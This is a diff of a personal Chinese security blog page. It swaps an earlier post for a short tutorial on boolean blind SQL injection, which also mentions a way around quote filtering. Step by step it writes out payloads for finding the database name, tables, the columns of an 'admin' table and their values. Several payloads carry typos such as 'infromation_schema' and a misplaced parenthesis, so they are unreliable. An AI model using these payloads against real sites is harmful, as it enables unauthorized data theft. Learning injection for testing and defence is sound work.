@@ -4,17 +4,17 @@
   <meta charset="utf-8">
   
   
-  <title>娜姐今晚刀谁？ | hiyajojo</title>
+  <title>布尔盲注 | hiyajojo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="This is MyBlog Notes">
+  <meta name="description" content="布尔盲注具体过程和原理原理：1.确定切入点2.对注入点测试获取原始注入利用语句3.python编写代码自动化注入 1.先判断是否可以布尔盲注2.id&#x3D;1 and length(database())&gt;&#x3D;1&#x2F;&#x2F;查看数据库名称长度3.id&#x3D;1 and substr(database(),1,1)&#x3D;’a’&#x2F;&#x2F;得到数据库名称 如果引号被过滤，可以使用ord(),将字符转化成ascii  列如：id&#x3D;">
 <meta property="og:type" content="article">
-<meta property="og:title" content="娜姐今晚刀谁？">
-<meta property="og:url" content="http://example.com/2021/01/26/%E5%A8%9C%E5%A7%90%E4%BB%8A%E6%99%9A%E5%88%80%E8%B0%81/index.html">
+<meta property="og:title" content="布尔盲注">
+<meta property="og:url" content="http://example.com/2021/03/05/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/index.html">
 <meta property="og:site_name" content="hiyajojo">
-<meta property="og:description" content="This is MyBlog Notes">
+<meta property="og:description" content="布尔盲注具体过程和原理原理：1.确定切入点2.对注入点测试获取原始注入利用语句3.python编写代码自动化注入 1.先判断是否可以布尔盲注2.id&#x3D;1 and length(database())&gt;&#x3D;1&#x2F;&#x2F;查看数据库名称长度3.id&#x3D;1 and substr(database(),1,1)&#x3D;’a’&#x2F;&#x2F;得到数据库名称 如果引号被过滤，可以使用ord(),将字符转化成ascii  列如：id&#x3D;">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2021-01-25T19:46:00.000Z">
-<meta property="article:modified_time" content="2021-01-25T11:47:09.731Z">
+<meta property="article:published_time" content="2021-03-05T13:44:21.000Z">
+<meta property="article:modified_time" content="2021-03-11T05:56:30.177Z">
 <meta property="article:author" content="hiyajojo">
 <meta name="twitter:card" content="summary">
   
@@ -77,10 +77,10 @@
 </header>
 
       <div class="outer">
-        <section id="main"><article id="post-娜姐今晚刀谁" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+        <section id="main"><article id="post-布尔盲注" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2021/01/26/%E5%A8%9C%E5%A7%90%E4%BB%8A%E6%99%9A%E5%88%80%E8%B0%81/" class="article-date">
-  <time class="dt-published" datetime="2021-01-25T19:46:00.000Z" itemprop="datePublished">2021-01-25</time>
+    <a href="/2021/03/05/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/" class="article-date">
+  <time class="dt-published" datetime="2021-03-05T13:44:21.000Z" itemprop="datePublished">2021-03-05</time>
 </a>
     
   </div>
@@ -91,7 +91,7 @@
         
   
     <h1 class="p-name article-title" itemprop="headline name">
-      娜姐今晚刀谁？
+      布尔盲注
     </h1>
   
 
@@ -99,11 +99,14 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        
+        <h2 id="布尔盲注具体过程和原理"><a href="#布尔盲注具体过程和原理" class="headerlink" title="布尔盲注具体过程和原理"></a>布尔盲注具体过程和原理</h2><h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><p>1.确定切入点<br>2.对注入点测试获取原始注入利用语句<br>3.python编写代码自动化注入</p>
+<h3 id="1-先判断是否可以布尔盲注"><a href="#1-先判断是否可以布尔盲注" class="headerlink" title="1.先判断是否可以布尔盲注"></a>1.先判断是否可以布尔盲注</h3><h3 id="2-id-1-and-length-database-gt-1-查看数据库名称长度"><a href="#2-id-1-and-length-database-gt-1-查看数据库名称长度" class="headerlink" title="2.id=1 and length(database())&gt;=1//查看数据库名称长度"></a>2.id=1 and length(database())&gt;=1//查看数据库名称长度</h3><h3 id="3-id-1-and-substr-database-1-1-’a’-得到数据库名称"><a href="#3-id-1-and-substr-database-1-1-’a’-得到数据库名称" class="headerlink" title="3.id=1 and substr(database(),1,1)=’a’//得到数据库名称"></a>3.id=1 and substr(database(),1,1)=’a’//得到数据库名称</h3><pre><code> 如果引号被过滤，可以使用ord(),将字符转化成ascii
+ 列如：id=1 and ord(substr(database()),1,1)=97</code></pre>
+<h3 id="4-and-ord-mid-select-table-name-from-infromation-schema-tables-where-table-schema-’web-sql’-limit-2-1-1-1-96-得到数据表名称"><a href="#4-and-ord-mid-select-table-name-from-infromation-schema-tables-where-table-schema-’web-sql’-limit-2-1-1-1-96-得到数据表名称" class="headerlink" title="4.and ord(mid((select table_name from infromation_schema.tables where table_schema=’web_sql’ limit 2,1),1,1))=96//得到数据表名称"></a>4.and ord(mid((select table_name from infromation_schema.tables where table_schema=’web_sql’ limit 2,1),1,1))=96//得到数据表名称</h3><h3 id="5-and-ord-mid-select-columu-name-from-infromation-schema-columus-where-table-name-’admin’-limit-2-1-1-1-96-字段名称"><a href="#5-and-ord-mid-select-columu-name-from-infromation-schema-columus-where-table-name-’admin’-limit-2-1-1-1-96-字段名称" class="headerlink" title="5.and ord(mid((select columu_name from infromation_schema.columus where table_name=’admin’ limit 2,1),1,1))=96//字段名称"></a>5.and ord(mid((select columu_name from infromation_schema.columus where table_name=’admin’ limit 2,1),1,1))=96//字段名称</h3><h3 id="6-and-ord-mid-select-字段-from-表名-1-1-97-获得数值部分"><a href="#6-and-ord-mid-select-字段-from-表名-1-1-97-获得数值部分" class="headerlink" title="6.and ord(mid((select 字段 from 表名),1,1))=97//获得数值部分"></a>6.and ord(mid((select 字段 from 表名),1,1))=97//获得数值部分</h3>
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/01/26/%E5%A8%9C%E5%A7%90%E4%BB%8A%E6%99%9A%E5%88%80%E8%B0%81/" data-id="ckm4gx2q00006v0uf397z7775" data-title="娜姐今晚刀谁？" class="article-share-link">分享</a>
+      <a data-url="http://example.com/2021/03/05/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/" data-id="ckm4gx2q10007v0uf6cev6d2z" data-title="布尔盲注" class="article-share-link">分享</a>
       
       
       
@@ -113,15 +116,20 @@
     
 <nav id="article-nav">
   
-    <a href="/2021/02/21/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2021/03/08/%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/" id="article-nav-newer" class="article-nav-link-wrap">
       <strong class="article-nav-caption">前一篇</strong>
       <div class="article-nav-title">
         
-          信息收集
+          布尔注入绕过
         
       </div>
     </a>
   
+  
+    <a href="/2021/03/01/%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%85%B7%E4%BD%93%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%AD%A5%E9%AA%A4/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">后一篇</strong>
+      <div class="article-nav-title">联合注入具体的过程和步骤</div>
+    </a>
   
 </nav>
 
